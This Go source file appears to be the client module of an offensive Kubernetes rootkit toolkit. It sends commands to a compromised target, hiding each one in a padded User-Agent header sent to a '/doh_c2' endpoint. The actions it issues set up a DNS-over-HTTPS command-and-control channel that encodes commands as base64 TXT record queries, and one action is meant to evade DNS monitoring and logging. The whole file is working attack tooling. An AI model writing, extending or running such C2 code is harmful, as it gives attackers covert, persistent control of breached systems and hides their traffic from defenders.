package doh_c2

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type DoHC2Result struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, resolver, domain, output string) error {
	result := &DoHC2Result{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"configure_doh_resolver",
			"set DoH endpoint (Cloudflare/Google/custom) for encrypted DNS C2 transport",
			"doh_c2_set_resolver",
		},
		{
			"register_c2_domain",
			"configure authoritative domain for TXT record command encoding",
			"doh_c2_set_domain",
		},
		{
			"encode_commands_txt",
			"encode C2 commands as base64 TXT record queries via DoH",
			"doh_c2_encode_cmd",
		},
		{
			"establish_channel",
			"initiate bidirectional C2 channel through DoH TXT record queries/responses",
			"doh_c2_establish",
		},
		{
			"bypass_dns_monitoring",
			"route all DNS through HTTPS to evade traditional DNS monitoring and logging",
			"doh_c2_bypass_monitor",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + resolver + "#" + domain
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/doh_c2", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
